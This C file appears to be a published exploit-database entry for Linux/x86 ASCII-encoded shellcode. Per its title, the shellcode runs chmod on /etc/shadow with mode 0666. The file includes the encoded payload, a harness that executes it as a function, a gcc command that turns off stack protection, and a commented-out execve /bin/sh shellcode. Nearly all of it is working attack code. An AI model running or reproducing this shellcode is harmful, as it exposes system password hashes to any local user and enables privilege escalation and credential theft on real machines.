  /*
 | Title: Linux/x86 chmod(/etc/shadow, 0666) ASCII   Shellcode 443 Bytes

 | Type: Shellcode
 | Author: agix
 | Platform: Linux X86
*/

  
/*  
#include <stdio.h>

char shellcode[] =
"LLLLhHEY!X5HEY!"
"HZTYRRRPTURWa-5lmm-2QQQ-8AAAfhRRfZ0p>0x?fh88fZ0p?fh  "
"fZ0pS0pH0p?fh55fZ0p@fhbbfZ0pA0pBfhyyfZ0pAfhwwfZ0pE0pB"
"fhDDfZ0pCfhddfZ0pU0pDfhzzfZ0pW0pDfhuufZ0pEfhhhfZ0pJ0p"
"FfhoofZ0pF0pMfhccfZ0pV0pGfhiifZ0pGfh//fZ0pL0pM0pHfhss"
"fZ0pIfhmmfZ0pIfhaafZ0pJfhHHfZ0pKfhnnfZ0pLfheefZ0pR0pN"
"0pOfhttfZ0pO0pN0xPfhVVfZ0pP0xQfh((fZ0pQfhPPfZ0pQfhfff"
"Z0pRfhFFfZ0pS0xSfhIIfZ0pTfhssfZ0pT0xTfhOOfZ0pV0xVfh22"
"fZ0pXfh  fZ0pX0xXfh@@fZ0pY0xY"

"c'est quoi ma note de secu ?";


int main(int argc, char **argv) {
        int *ret;
        ret = (int *)&ret + 2;
        (*ret) = (int) shellcode;
} 
  
  */
#include<stdio.h>
#include<string.h>

unsigned char code[] = 
//"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";
"LLLLhHEY!X5HEY!"
"HZTYRRRPTURWa-5lmm-2QQQ-8AAAfhRRfZ0p>0x?fh88fZ0p?fh  "
"fZ0pS0pH0p?fh55fZ0p@fhbbfZ0pA0pBfhyyfZ0pAfhwwfZ0pE0pB"
"fhDDfZ0pCfhddfZ0pU0pDfhzzfZ0pW0pDfhuufZ0pEfhhhfZ0pJ0p"
"FfhoofZ0pF0pMfhccfZ0pV0pGfhiifZ0pGfh//fZ0pL0pM0pHfhss"
"fZ0pIfhmmfZ0pIfhaafZ0pJfhHHfZ0pKfhnnfZ0pLfheefZ0pR0pN"
"0pOfhttfZ0pO0pN0xPfhVVfZ0pP0xQfh((fZ0pQfhPPfZ0pQfhfff"
"Z0pRfhFFfZ0pS0xSfhIIfZ0pTfhssfZ0pT0xTfhOOfZ0pV0xVfh22"
"fZ0pXfh  fZ0pX0xXfh@@fZ0pY0xY"

"c'est quoi ma note de secu ?";

main()
{

    printf("Shellcode Length: %d\n", strlen(code));

    int (*ret)() = (int(*)())code;

    ret();
}


//gcc testshellcode.c -o testshellcode -fno-stack-protector -z execstack -no-pie -m32